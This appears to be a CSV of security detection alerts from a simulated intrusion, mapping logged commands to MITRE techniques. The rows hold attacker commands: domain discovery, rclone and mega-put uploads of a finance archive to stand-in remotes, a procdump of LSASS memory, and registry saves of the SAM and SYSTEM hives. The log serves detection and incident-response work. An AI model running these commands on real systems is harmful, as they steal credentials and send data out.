timestamp,host,rule,severity,mitre,command_excerpt,matched_context
2026-01-15T09:45:00+00:00,WS-301,Account Or System Discovery,low,T1087.001,whoami /all,whoami /all
2026-01-15T09:46:00+00:00,WS-301,Account Or System Discovery,low,T1087.001,nltest /domain_trusts,nltest /domain_trusts
2026-01-15T09:46:00+00:00,WS-301,Domain Trust Discovery,low,T1482,nltest /domain_trusts,nltest /domain_trusts
2026-01-15T09:47:00+00:00,WS-301,Network Share Discovery,low,T1135,net view /domain,net view /domain
2026-01-15T09:48:00+00:00,WS-301,DNS Lookup Discovery,low,T1018,nslookup _ldap._tcp.dc._msdcs.example.local,nslookup _ldap._tcp.dc._msdcs.example.local
2026-01-15T09:49:00+00:00,WS-301,ADFind Active Directory Discovery,medium,T1087.002,adfind -f objectcategory=person,adfind -f objectcategory=person
2026-01-15T09:50:00+00:00,WS-301,Process Discovery,low,T1057,tasklist /svc,tasklist /svc
2026-01-15T09:51:00+00:00,WS-301,Security Software Discovery,medium,T1518.001,Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct,mespace root/SecurityCenter2 -ClassName AntivirusProduct
2026-01-15T10:10:00+00:00,FS-02,Archive Collected Files,low,T1560.001,7z a C:\Temp\finance_archive.7z C:\Shares\Finance\*.xlsx,7z a C:\Temp\finance_archive.7z C:\Shares\Fi
2026-01-15T10:12:00+00:00,FS-02,Rclone Cloud Exfiltration Tool,high,T1567.002,rclone copy C:\Temp\finance_archive.7z remote:incident-demo --log-file C:\Temp\rclone.log,rclone copy C:\Temp\finance_archive.7z remote:incid
2026-01-15T10:14:00+00:00,FS-02,MEGA CLI Exfiltration Tool,high,T1567.002,mega-put C:\Temp\finance_archive.7z /Root/demo,mega-put C:\Temp\finance_archive.7z /Root/demo
2026-01-15T10:16:00+00:00,FS-02,Suspicious Web Download,medium,T1105,[REDACTED] https://example.local/checkin?id=192.168.10.55&[BASE64...REDACTED],[REDACTED] https://example.local/checkin?id=192.16
2026-01-15T09:10:00+00:00,SRV-DC01,LSASS Dump Attempt,high,T1003.001,procdump -ma lsass.exe C:\Temp\lsass_simulated.dmp,procdump -ma lsass.exe C:\Temp\lsass_simulated.dmp
2026-01-15T09:12:00+00:00,SRV-DC01,SAM SYSTEM Hive Save,high,T1003.002,reg save HKLM\SAM C:\Temp\sam.save,reg save HKLM\SAM C:\Temp\sam.save
2026-01-15T09:13:00+00:00,SRV-DC01,SAM SYSTEM Hive Save,high,T1003.002,reg save HKLM\SYSTEM C:\Temp\system.save,reg save HKLM\SYSTEM C:\Temp\system.save
